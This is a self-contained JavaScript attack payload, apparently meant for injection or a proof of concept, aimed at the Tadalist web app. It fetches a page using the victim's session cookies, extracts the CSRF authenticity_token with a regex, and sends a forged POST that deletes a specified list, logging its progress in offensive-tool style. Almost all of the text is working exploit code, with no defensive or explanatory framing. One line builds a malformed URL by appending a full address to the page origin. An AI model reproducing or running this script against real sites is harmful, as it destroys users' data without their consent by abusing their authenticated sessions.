(async () => {
  try {
    const origin = window.location.origin;
    const listsUrl = origin + 'https://123456.tadalist.com/lists';
    const targetUrl = 'https://123456.tadalist.com/lists/2356146'; // target list URL

    // Function to extract token from onclick attributes in a DOM
    function extractTokenFromDoc(doc) {
      for (const el of doc.querySelectorAll('[onclick]')) {
        const onclick = el.getAttribute('onclick');
        if (!onclick) continue;
        const m = onclick.match(/setAttribute\(['"]name['"],\s*['"]authenticity_token['"]\);\s*.*setAttribute\(['"]value['"],\s*['"]([^'"]+)['"]\)/i);
        if (m) return m[1];
      }
      return null;
    }

    let token = null;
    if (window.location.pathname === '/lists') {
      console.log('[+] On /lists page, extracting token...');
      token = extractTokenFromDoc(document);
    } else {
      console.log('[+] Not on /lists page, fetching token from', listsUrl);
      const res = await fetch(listsUrl, {credentials:'include'});
      if (!res.ok) throw new Error('Failed to fetch /lists page');
      const html = await res.text();
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      token = extractTokenFromDoc(doc);
    }

    if (!token) {
      console.error('[-] authenticity_token not found!');
      return;
    }
    console.log('[+] Found authenticity_token:', token);

    const formData = new URLSearchParams();
    formData.append('_method', 'delete');
    formData.append('authenticity_token', token);

    console.log('[+] Sending delete request to', targetUrl);
    const response = await fetch(targetUrl, {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: formData.toString(),
      redirect: 'follow'
    });

    if (response.ok) {
      console.log('[+] List deleted successfully!');
    } else {
      console.warn(`[-] Failed to delete list. Status: ${response.status}`);
      const text = await response.text();
      console.log('[>] Response snippet:', text.slice(0,500));
    }

  } catch (err) {
    console.error('[-] Error:', err);
  }
})();
